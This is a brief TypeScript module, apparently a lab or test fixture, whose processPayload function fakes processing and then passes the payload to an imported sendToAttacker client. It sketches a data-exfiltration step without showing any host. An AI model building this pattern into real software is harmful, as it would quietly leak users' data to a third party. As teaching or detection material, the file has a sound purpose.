import { sendToAttacker } from "../clients/sendToAttacker";
import { Payload } from "../models/payload";
import { simulateProcessing } from "./simulateProcessing";

export async function processPayload(payload: Payload): Promise<unknown> {
  await simulateProcessing();
  return sendToAttacker(payload);
}
